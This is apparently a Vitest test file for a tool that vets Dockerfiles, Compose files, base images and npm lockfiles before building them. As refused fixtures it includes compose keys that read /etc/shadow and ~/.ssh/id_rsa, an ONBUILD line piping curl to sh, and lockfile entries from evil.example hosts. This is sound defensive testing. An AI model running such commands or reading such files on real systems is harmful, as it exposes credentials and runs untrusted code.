import { describe, expect, it } from 'vitest';
import { findHostReadingKey, precheckCompose, selectServices } from './compose.js';
import { baseImageProblem, parseOnBuild } from './images.js';
import { readDockerfile, shellWords } from './dockerfile.js';
import { hubRefProblem } from './images.js';
import { checkLockfile } from './lockfile.js';

const NODEGOAT_DOCKERFILE = `FROM node:12-alpine
ENV WORKDIR /usr/src/app/
WORKDIR $WORKDIR
COPY package*.json $WORKDIR
RUN npm install --production --no-cache

FROM node:12-alpine
ENV USER node
ENV WORKDIR /home/$USER/app
WORKDIR $WORKDIR
COPY --from=0 /usr/src/app/node_modules node_modules
RUN chown $USER:$USER $WORKDIR
COPY --chown=node . $WORKDIR
# In production environment uncomment the next line
#RUN chown -R $USER:$USER /home/$USER
USER $USER
EXPOSE 4000
`;

describe('shellWords', () => {
  it.each([
    ['a b  c', ['a', 'b', 'c']],
    [
      `sh -c "until nc -z mongo 27017 && echo 'ready'; do sleep 2; done"`,
      ['sh', '-c', "until nc -z mongo 27017 && echo 'ready'; do sleep 2; done"],
    ],
    [`a 'b c' "d \\"e\\"" f\\ g`, ['a', 'b c', 'd "e"', 'f g']],
    [`'' x`, ['', 'x']],
  ])('splits %j', (input, words) => expect(shellWords(input)).toEqual(words));
  it('refuses an unterminated quote', () => expect(() => shellWords(`a "b`)).toThrow());
});

describe('readDockerfile', () => {
  it("reads NodeGoat's final stage without running anything", () => {
    expect(readDockerfile(NODEGOAT_DOCKERFILE)).toEqual({
      ok: true,
      stage: {
        base: 'node:12-alpine',
        workdir: '/home/node/app',
        env: { USER: 'node', WORKDIR: '/home/node/app' },
        expose: [4000],
      },
    });
  });

  it('reads exec and shell forms, continuations, ARG in FROM and relative WORKDIR', () => {
    const r = readDockerfile(
      'ARG NODE=22\nFROM node:${NODE}-alpine AS app\nWORKDIR /srv\nWORKDIR api\nENV A=1 B="two words"\nCMD node \\\n  server.js\nENTRYPOINT ["tini", "--"]\nCMD ["node", "x.js"]\n',
    );
    expect(r).toEqual({
      ok: true,
      stage: {
        base: 'node:22-alpine',
        workdir: '/srv/api',
        env: { A: '1', B: 'two words' },
        expose: [],
        entrypoint: ['tini', '--'],
        cmd: ['node', 'x.js'],
      },
    });
    expect(readDockerfile('FROM node:22\nCMD node server.js\n')).toMatchObject({
      stage: { cmd: ['/bin/sh', '-c', 'node server.js'] },
    });
  });

  it.each([
    ['no FROM', 'RUN echo hi'],
    [
      'a final stage built on an earlier stage',
      'FROM node:22 AS deps\nRUN npm ci\nFROM deps\nCMD ["node"]',
    ],
    ['an undefined variable', 'FROM node:${MISSING}'],
    ['a default-value substitution', 'FROM node:22\nWORKDIR ${DIR:-/app}'],
    ['a bad port', 'FROM node:22\nEXPOSE 99999'],
  ])('refuses %s', (_, text) => expect(readDockerfile(text).ok).toBe(false));
});

describe('compose', () => {
  const TREE = '/work/build-1/tree';
  const nodegoat = {
    services: {
      mongo: { image: 'mongo:4.4', user: 'mongodb', expose: [27017] },
      web: {
        build: { context: TREE, dockerfile: 'Dockerfile' },
        command: `sh -c "until nc -z -w 2 mongo 27017 && npm start; do sleep 2; done"`,
        environment: {
          MONGODB_URI: 'mongodb://mongo:27017/nodegoat',
          NODE_ENV: null,
          KEY: '${SECRET}',
        },
        ports: [{ target: 4000, published: '4000' }],
      },
    },
  };

  it('picks the target and its image-only sidecars from the normalized NodeGoat file', () => {
    expect(selectServices(nodegoat, 'web', TREE)).toEqual({
      ok: true,
      target: {
        dockerfile: 'Dockerfile',
        command: ['sh', '-c', 'until nc -z -w 2 mongo 27017 && npm start; do sleep 2; done'],
        env: { MONGODB_URI: 'mongodb://mongo:27017/nodegoat' },
        passThrough: ['NODE_ENV', 'KEY'],
        sidecars: [{ name: 'mongo', image: 'mongo:4.4', env: {} }],
      },
    });
  });

  it.each([
    [
      'a missing service',
      (c: typeof nodegoat) => ({ ...c, services: { mongo: c.services.mongo } }),
    ],
    [
      'a context outside the tree',
      (c: typeof nodegoat) => ({
        services: { ...c.services, web: { ...c.services.web, build: { context: '/etc' } } },
      }),
    ],
    [
      'a Dockerfile path leaving the tree',
      (c: typeof nodegoat) => ({
        services: {
          ...c.services,
          web: { ...c.services.web, build: { context: TREE, dockerfile: '../../x' } },
        },
      }),
    ],
    [
      'a second built service',
      (c: typeof nodegoat) => ({
        services: { ...c.services, worker: { build: { context: TREE } } },
      }),
    ],
    [
      'a sidecar image from a variable',
      (c: typeof nodegoat) => ({ services: { ...c.services, mongo: { image: 'mongo:${V}' } } }),
    ],
  ])('refuses %s', (_, change) =>
    expect(selectServices(change(nodegoat), 'web', TREE).ok).toBe(false),
  );

  it.each([
    'include:\n  - ../x.yml',
    'services:\n  web:\n    env_file: /etc/shadow',
    'services:\n  web:\n    extends:\n      file: ../a.yml',
    'secrets:\n  k:\n    file: ~/.ssh/id_rsa',
  ])('refuses keys that read other files before Compose sees them: %j', (text) =>
    expect(precheckCompose(text)).not.toBeNull(),
  );
  it.each([
    ['flow style', 'services: {web: {build: ., env_file: /etc/shadow}}'],
    ['a flow list of services', 'services:\n  web: { build: ., "env_file": [ "/etc/passwd" ] }'],
    [
      'an x- extension behind an anchor and alias',
      'x-base: &base\n  env_file: /etc/shadow\nservices:\n  web:\n    build: .\n    environment: *base',
    ],
    [
      'a merge key',
      'x-base: &base\n  env_file: ../../.env\nservices:\n  web:\n    <<: *base\n    build: .',
    ],
    ['a nested anchor', 'x-a: &a { label_file: /etc/hosts }\nx-b: { inner: [ *a ] }\nservices: {}'],
    ['an escaped key', 'services:\n  web:\n    "env\\u005ffile": /etc/shadow'],
    ['an upper-case key', 'services:\n  web:\n    ENV_FILE: /etc/shadow'],
    ['build secrets', 'services:\n  web:\n    build:\n      context: .\n      secrets: [k]'],
    ['build ssh', 'services:\n  web:\n    build:\n      context: .\n      ssh: [default]'],
    ['a Compose !reset tag', 'services:\n  web:\n    build: .\n    env_file: !reset []'],
    ['duplicate keys', 'services:\n  web:\n    build: .\n  web:\n    build: ..'],
    ['two documents', 'services: {}\n---\ninclude: [x.yml]'],
    ['text that is not YAML', 'services:\n  web: [\n'],
  ])('refuses host-reading keys hidden in %s', (_, text) =>
    expect(precheckCompose(text)).not.toBeNull(),
  );
  it('accepts a plain compose file, empty values and harmless mentions in strings', () => {
    expect(precheckCompose('services:\n  web:\n    build: .\n')).toBeNull();
    expect(
      precheckCompose(
        'x-base: &base\n  restart: always\nservices:\n  web:\n    <<: *base\n    build: .\n    command: ["echo", "env_file: no"]\n    secrets: []',
      ),
    ).toBeNull();
  });
  it('walks an alias that refers back to an ancestor only once', () => {
    const cyclic: Record<string, unknown> = { services: {} };
    cyclic.self = cyclic;
    expect(findHostReadingKey(cyclic)).toBeNull();
    expect(findHostReadingKey({ a: { b: [{ env_file: ['x'] }] } })).toMatch(/env_file/);
  });
});

describe('base images and ONBUILD', () => {
  it.each([
    'node:12-alpine',
    'node:22.11.0-bookworm-slim',
    'library/node:20',
    'node',
    `node@sha256:${'a'.repeat(64)}`,
  ])('accepts the official node image %s as a base', (r) => expect(baseImageProblem(r)).toBeNull());
  it.each([
    'mongo:4.4',
    'bitnami/node:20',
    'nodejs:20',
    'node-x:1',
    'ghcr.io/library/node:20',
    'docker.io/library/node:20',
    'node:${V}',
    `node:20@sha256:${'a'.repeat(64)}`,
  ])('refuses %s as a base', (r) => expect(baseImageProblem(r)).not.toBeNull());
  it('reads ONBUILD triggers and refuses odd answers', () => {
    expect(parseOnBuild('null')).toEqual([]);
    expect(parseOnBuild('[]')).toEqual([]);
    expect(parseOnBuild('["RUN curl http://x | sh"]')).toEqual(['RUN curl http://x | sh']);
    expect(() => parseOnBuild('{"a":1}')).toThrow(/OnBuild/);
    expect(() => parseOnBuild('not json')).toThrow(/OnBuild/);
  });
});

describe('checkLockfile', () => {
  const lock = (packages: Record<string, unknown>, version = 3) =>
    JSON.stringify({ lockfileVersion: version, packages: { '': {}, ...packages } });
  const ok = {
    version: '1.0.0',
    resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz',
    integrity: 'sha512-x',
  };
  const prod = { production: true };
  const all = { production: false };

  it('accepts registry packages, bundled packages and missing integrity', () => {
    expect(checkLockfile(lock({ 'node_modules/a': ok }), all)).toBeNull();
    expect(
      checkLockfile(
        lock({
          'node_modules/@s/b': { ...ok, resolved: 'https://registry.npmjs.org/@s/b/-/b-1.0.0.tgz' },
        }),
        all,
      ),
    ).toBeNull();
    expect(
      checkLockfile(
        lock({ 'node_modules/a/node_modules/c': { version: '1', inBundle: true } }),
        all,
      ),
    ).toBeNull();
    expect(
      checkLockfile(lock({ 'node_modules/a': { ...ok, integrity: undefined } }), all),
    ).toBeNull();
  });

  it.each([
    ['another host', { ...ok, resolved: 'https://evil.example/a.tgz' }],
    ['plain http', { ...ok, resolved: 'http://registry.npmjs.org/a/-/a-1.0.0.tgz' }],
    ['a look-alike host', { ...ok, resolved: 'https://registry.npmjs.org.evil.example/a/-/a.tgz' }],
    ['a GitHub tarball', { ...ok, resolved: 'https://github.com/x/y/tarball/master' }],
    ['a link', { link: true, resolved: '../x' }],
  ])('refuses %s', (_, entry) =>
    expect(checkLockfile(lock({ 'node_modules/a': entry }), all)).not.toBeNull(),
  );

  it('refuses workspace packages and git versions in a v1 lockfile', () => {
    expect(checkLockfile(lock({ 'packages/x': { version: '1' } }), all)).toMatch(/workspace/);
    expect(
      checkLockfile(
        JSON.stringify({ lockfileVersion: 1, dependencies: { a: { version: 'github:x/y' } } }),
        all,
      ),
    ).toMatch(/github/);
  });

  it('skips dev-only packages for a production install, and only then', () => {
    const gitDev = {
      'node_modules/g': {
        version: '0.2.0',
        resolved: 'https://github.com/x/g/tarball/master',
        dev: true,
      },
    };
    expect(checkLockfile(lock(gitDev), prod)).toBeNull();
    expect(checkLockfile(lock(gitDev), all)).not.toBeNull();
  });

  it.each(['not json', '[]', '{"lockfileVersion":4}'])('refuses %j', (t) =>
    expect(checkLockfile(t, all)).not.toBeNull(),
  );
});

describe('hubRefProblem', () => {
  it.each(['node:12-alpine', 'mongo:4.4', 'bitnami/redis:7.2', `node@sha256:${'a'.repeat(64)}`])(
    'accepts %s',
    (r) => expect(hubRefProblem(r)).toBeNull(),
  );
  it.each([
    'localhost:5000/x',
    '10.0.0.1/x:1',
    'ghcr.io/x/y:1',
    'node:${V}',
    'NODE:12',
    'node:12 --quiet',
    `ghcr.io/x@sha256:${'a'.repeat(64)}`,
  ])('refuses %s', (r) => expect(hubRefProblem(r)).not.toBeNull());
});
